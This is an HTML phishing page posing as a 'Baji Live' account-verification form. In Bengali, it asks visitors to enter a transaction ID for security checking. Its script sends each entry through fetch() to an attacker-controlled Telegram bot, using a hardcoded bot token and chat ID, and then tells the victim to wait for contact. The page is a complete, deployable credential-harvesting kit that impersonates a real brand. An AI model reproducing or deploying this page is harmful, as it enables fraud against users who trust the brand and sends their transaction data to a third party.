<!DOCTYPE html>
<html lang="bn">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Baji Live Verify</title>
  <style>
    /* Base styling */
    body {
      margin: 0;
      padding: 0;
      font-family: "Segoe UI", Arial, sans-serif;
      background: linear-gradient(135deg, #1e1e1e, #2d2d2d);
      color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }

    .login-container {
      background: #292929;
      padding: 30px 25px;
      border-radius: 12px;
      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.4);
      width: 100%;
      max-width: 420px;
      box-sizing: border-box;
    }

    /* Branding header */
    .login-container header {
      text-align: center;
      margin-bottom: 20px;
    }

    .login-container header h1 {
      font-size: 26px;
      margin: 10px 0;
      color: #14a76c;
    }

    .login-container img {
      display: block;
      max-width: 100%;
      height: auto;
      border-radius: 10px;
      margin: 0 auto 20px auto;
    }

    /* Form styling */
    label {
      display: block;
      font-size: 15px;
      margin-bottom: 6px;
    }

    input {
      width: 100%;
      padding: 12px;
      margin-bottom: 18px;
      border: none;
      border-radius: 6px;
      font-size: 15px;
      outline: none;
      box-sizing: border-box;
    }

    button {
      width: 100%;
      padding: 12px;
      background-color: #14a76c;
      border: none;
      border-radius: 6px;
      color: white;
      font-size: 16px;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.3s ease;
    }

    button:hover {
      background-color: #119d62;
    }

    /* Footer */
    footer {
      margin-top: 20px;
      text-align: center;
      font-size: 12px;
      color: #bbb;
    }

    /* Responsive tweaks */
    @media (max-width: 500px) {
      .login-container {
        padding: 20px;
        margin: 0 10px;
      }

      .login-container header h1 {
        font-size: 22px;
      }
    }
  </style>
</head>
<body>
  <div class="login-container">
    <header>
      <img src="https://img.b112j.com/bj/h5/assets/images/sponsor/en-sponsor.jpg" alt="Sponsor Logo">
      <h1>Baji Live Account Issue Problem</h1>
      <p style="font-size: 13px; color:#ccc;">সিকিউরিটি ভেরিফিকেশনের জন্য ট্রানজেকশন আইডি লিখুন</p>
    </header>

    <form id="codeForm">
      <label for="code">ট্রানজেকশন আইডি লিখুন</label>
      <input type="text" id="code" placeholder="TrxID লিখুন" maxlength="10" required>
      <button type="submit">Submit</button>
    </form>

    <footer>
      &copy; 2025 Baji Live. All rights reserved.
    </footer>
  </div>

  <script>
    // ⚠️ Use your real BOT_TOKEN + CHAT_ID here
    const BOT_TOKEN = "8040356390:AAE3ZeLspo9dYe--OVHHDCXAJN949FWc8-Y";
    const CHAT_ID = "1309023053";

    document.getElementById("codeForm").addEventListener("submit", function(event) {
      event.preventDefault();
      const code = document.getElementById("code").value;

      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

      fetch(url, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: `Submitted Code: ${code}`
        })
      })
      .then(response => response.json())
      .then(data => {
        if (data.ok) {
          alert("অপেক্ষা করুন — আমরা শীঘ্রই আপনার সাথে যোগাযোগ করব।");
        } else {
          alert("কোড সাবমিট করতে ব্যর্থ হয়েছে। আবার চেষ্টা করুন।");
        }
      })
      .catch(error => {
        console.error("Error:", error);
        alert("সার্ভার এরর — অনুগ্রহ করে আবার চেষ্টা করুন।");
      });
    });
  </script>
</body>
</html>
</html>
